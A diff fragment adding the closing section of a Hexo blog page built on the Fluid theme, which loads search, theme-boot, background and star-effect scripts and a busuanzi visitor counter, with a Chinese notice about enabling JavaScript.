+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="https://static.kevinchu.top/blog/assets/js/stars.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
